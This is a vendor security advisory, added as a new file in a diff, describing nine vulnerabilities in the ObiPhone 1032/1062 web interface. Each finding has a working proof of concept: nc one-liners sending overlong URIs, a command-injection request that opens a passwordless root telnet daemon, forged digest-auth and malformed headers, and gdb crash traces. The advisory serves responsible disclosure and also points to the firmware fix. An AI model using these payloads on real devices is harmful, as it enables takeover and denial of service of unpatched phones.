@@ -1,0 +1,268 @@
+ObiHai ObiPhone - Multiple Vulnerabilities
+------------------------------------------
+
+Introduction
+============
+Multiple vulnerabilities were discovered in the web management
+interface of the ObiHai ObiPhone products.  The Vulnerabilities were
+discovered during a black box security assessment and therefore the
+vulnerability list should not be considered exhaustive.
+
+Affected Devices and Versions
+=============================
+ObiPhone 1032/1062 with firmware less than 5-0-0-3497.
+
+Vulnerability Overview
+======================
+Obi-1. Memory corruption leading to free() of an attacker-controlled address
+Obi-2. Command injection in WiFi Config
+Obi-3. Denial of Service due to buffer overflow
+Obi-4. Buffer overflow in internal socket handler
+Obi-5. Cross-site request forgery
+Obi-6. Failure to implement RFC 2617 correctly
+Obi-7. Invalid pointer dereference due to invalid header
+Obi-8. Null pointer dereference due to malicious URL
+Obi-9. Denial of service due to invalid content-length
+
+Vulnerability Details
+=====================
+
+----------------------------------------------------------------------------
+Obi-1. Memory corruption leading to free() of an attacker-controlled address
+----------------------------------------------------------------------------
+
+By providing a long URI (longer than 256 bytes) not containing a slash in a
+request, a pointer is overwritten which is later passed to free().  By
+controlling the location of the pointer, this would allow an attacker to affect
+control flow and gain control of the application.  Note that the free() seems to
+occur during cleanup of the request, as a 404 is returned to the user before the
+segmentation fault.
+
+  python -c 'print "GET " + "A"*257 + " HTTP/1.1\nHost: foo"' | nc IP 80
+
+  (gdb) bt
+  #0  0x479d8b18 in free () from root/lib/libc.so.6
+  #1  0x00135f20 in ?? ()
+  (gdb) x/5i $pc
+  => 0x479d8b18 <free+48>:        ldr     r3, [r0, #-4]
+    0x479d8b1c <free+52>:        sub     r5, r0, #8
+    0x479d8b20 <free+56>:        tst     r3, #2
+    0x479d8b24 <free+60>:        bne     0x479d8bec <free+260>
+    0x479d8b28 <free+64>:        tst     r3, #4
+  (gdb) i r r0
+  r0             0x41     65
+
+---------------------------------------
+Obi-2. Command injection in WiFi Config
+---------------------------------------
+
+An authenticated user (including the lower-privileged "user" user) can enter a
+hidden network name similar to "$(/usr/sbin/telnetd &)", which starts the telnet
+daemon.
+
+  GET /wifi?checkssid=$(/usr/sbin/telnetd%20&) HTTP/1.1
+  Host: foo
+  Authorization: [omitted]
+
+Note that telnetd is now running and accessible via user "root" with no
+password.
+
+-----------------------------------------------
+Obi-3. Denial of Service due to buffer overflow
+-----------------------------------------------
+
+By providing a long URI (longer than 256 bytes) beginning with a slash, memory
+is overwritten beyond the end of mapped memory, leading to a crash.  Though no
+exploitable behavior was observed, it is believed that memory containing
+information relevant to the request or control flow is likely overwritten in the
+process.  strcpy() appears to write past the end of the stack for the current
+thread, but it does not appear that there are saved link registers on the stack
+for the devices under test.
+
+  python -c 'print "GET /" + "A"*256 + " HTTP/1.1\nHost: foo"' | nc IP 80
+
+  (gdb) bt
+  #0  0x479dc440 in strcpy () from root/lib/libc.so.6
+  #1  0x001361c0 in ?? ()
+  Backtrace stopped: previous frame identical to this frame (corrupt stack?)
+  (gdb) x/5i $pc
+  => 0x479dc440 <strcpy+16>:      strb    r3, [r1, r2]
+    0x479dc444 <strcpy+20>:      bne     0x479dc438 <strcpy+8>
+    0x479dc448 <strcpy+24>:      bx      lr
+    0x479dc44c <strcspn>:        push    {r4, r5, r6, lr}
+    0x479dc450 <strcspn+4>:      ldrb    r3, [r0]
+  (gdb) i r r1 r2
+  r1             0xb434df01       3023363841
+  r2             0xff     255
+  (gdb) p/x $r1+$r2
+  $1 = 0xb434e000
+
+-------------------------------------------------
+Obi-4. Buffer overflow in internal socket handler
+-------------------------------------------------
+
+Commands to be executed by realtime backend process `obid` are sent
+via Unix domain sockets from obiapp.
+In formatting the message for the Unix socket, a new string is constructed on
+the stack.  This string can overflow the static buffer, leading to control of
+program flow.  The only vectors leading to this code that were discovered during
+the assessment were authenticated, however unauthenticated code paths may exist.
+Note that the example command can be executed as the lower-privileged "user"
+user.
+
+  GET /wifi?checkssid=[A*1024] HTTP/1.1
+  Host: foo
+  Authorization: [omitted]
+
+  (gdb)
+  #0  0x41414140 in ?? ()
+  #1  0x0006dc78 in ?? ()
+
+---------------------------------
+Obi-5. Cross-site request forgery
+---------------------------------
+
+All portions of the web interface appear to lack any protection against
+Cross-Site Request Forgery.  Combined with the command injection vector in
+ObiPhone-3, this would allow a remote attacker to execute arbitrary shell
+commands on the phone, provided the current browser session was logged-in to the
+phone.
+
+----------------------------------------------
+Obi-6. Failure to implement RFC 2617 correctly
+----------------------------------------------
+
+RFC 2617 specifies HTTP digest authentication, but is not correctly implemented
+on the ObiPhone.  The HTTP digest authentication fails to comply in the
+following ways:
+
+- The URI is not validated
+- The application does not verify that the nonce received is the one it sent
+- The application does not verify that the nc value does not repeat or go
+  backwards
+
+  GET / HTTP/1.1
+  Host: foo
+  Authorization: Digest username="admin", realm="a", nonce="a", uri="/",
+  algorithm=MD5, response="309091eb609a937358a848ff817b231c",
+opaque="", qop=auth,
+  nc=00000001, cnonce="a"
+  Connection: close
+
+  HTTP/1.1 200 OK
+  Server: OBi110
+  Cache-Control:must-revalidate, no-store, no-cache
+  Content-Type: text/html
+  Content-Length: 1108
+  Connection: close
+
+Please note that the realm, nonce, cnonce, and nc values have all been chosen
+and the response generated offline.
+
+--------------------------------------------------------
+Obi-7. Invalid pointer dereference due to invalid header
+--------------------------------------------------------
+
+Sending an invalid HTTP Authorization header, such as
+"Authorization: foo", causes the program to attempt to read from an invalid
+memory address, leading to a segmentation fault and reboot of the device.  This
+requires no authentication, only access to the network to which the device is
+connected.
+
+  GET / HTTP/1.1
+  Host: foo
+  Authorization: foo
+
+This causes the server to dereference the address 0xFFFFFFFF, presumably
+returned as a -1 error code.
+
+  (gdb) bt
+  #0  0x479dc438 in strcpy () from root/lib/libc.so.6
+  #1  0x00134ae0 in ?? ()
+  (gdb) x/5i $pc
+  => 0x479dc438 <strcpy+8>:       ldrb    r3, [r1, #1]!
+    0x479dc43c <strcpy+12>:      cmp     r3, #0
+    0x479dc440 <strcpy+16>:      strb    r3, [r1, r2]
+    0x479dc444 <strcpy+20>:      bne     0x479dc438 <strcpy+8>
+    0x479dc448 <strcpy+24>:      bx      lr
+  (gdb) i r r1
+  r1             0xffffffff       4294967295
+
+----------------------------------------------------
+Obi-8. Null pointer dereference due to malicious URL
+----------------------------------------------------
+
+If the /obihai-xml handler is requested without any trailing slash or component,
+this leads to a null pointer dereference, crash, and subsequent reboot of the
+phone.  This requires no authentication, only access to the network to which the
+device is connected.
+
+  GET /obihai-xml HTTP/1.1
+  Host: foo
+
+  (gdb) bt
+  #0  0x479dc7f4 in strlen () from root/lib/libc.so.6
+  Backtrace stopped: Cannot access memory at address 0x8f6
+  (gdb) info frame
+  Stack level 0, frame at 0xbef1aa50:
+  pc = 0x479dc7f4 in strlen; saved pc = 0x171830
+  Outermost frame: Cannot access memory at address 0x8f6
+  Arglist at 0xbef1aa50, args:
+  Locals at 0xbef1aa50, Previous frame's sp is 0xbef1aa50
+  (gdb) x/5i $pc
+  => 0x479dc7f4 <strlen+4>:       ldr     r2, [r1], #4
+    0x479dc7f8 <strlen+8>:       ands    r3, r0, #3
+    0x479dc7fc <strlen+12>:      rsb     r0, r3, #0
+    0x479dc800 <strlen+16>:      beq     0x479dc818 <strlen+40>
+    0x479dc804 <strlen+20>:      orr     r2, r2, #255    ; 0xff
+  (gdb) i r r1
+  r1             0x0      0
+
+------------------------------------------------------
+Obi-9. Denial of service due to invalid content-length
+------------------------------------------------------
+
+Content-Length headers of -1, -2, or -3 result in a crash and device reboot.
+This does not appear exploitable to gain execution.  Larger (more negative)
+values return a page stating "Firmware Update Failed" though it does not appear
+any attempt to update the firmware with the posted data occurred.
+
+  POST / HTTP/1.1
+  Host: foo
+  Content-Length: -1
+
+  Foo
+
+This appears to write a constant value of 0 to an address controlled by the
+Content-Length parameter, but since it appears to be relative to a freshly
+mapped page of memory (perhaps via mmap() or malloc()), it does not appear this
+can be used to gain control of the application.
+
+  (gdb) bt
+  #0  0x00138250 in HTTPD_msg_proc ()
+  #1  0x00070138 in ?? ()
+  (gdb) x/5i $pc
+  => 0x138250 <HTTPD_msg_proc+396>:       strb    r1, [r3, r2]
+    0x138254 <HTTPD_msg_proc+400>:       ldr     r1, [r4, #24]
+    0x138258 <HTTPD_msg_proc+404>:       ldr     r0, [r4, #88]   ; 0x58
+    0x13825c <HTTPD_msg_proc+408>:       bl      0x135a98
+    0x138260 <HTTPD_msg_proc+412>:       ldr     r0, [r4, #88]   ; 0x58
+  (gdb) i r r3 r2
+  r3             0xafcc7000       2949410816
+  r2             0xffffffff       4294967295
+
+Mitigation
+==========
+Upgrade to Firmware 5-0-0-3497 (5.0.0 build 3497) or newer.
+
+Author
+======
+The issues were discovered by David Tomaschik of the Google Security Team.
+
+Timeline
+========
+- 2016/05/12 - Reported to ObiHai
+- 2016/05/12 - Findings Acknowledged by ObiHai
+- 2016/05/20 - ObiHai reports working on patches for most issues
+- 2016/06/?? - New Firmware posted to ObiHai Website
+- 2016/08/18 - Public Disclosure
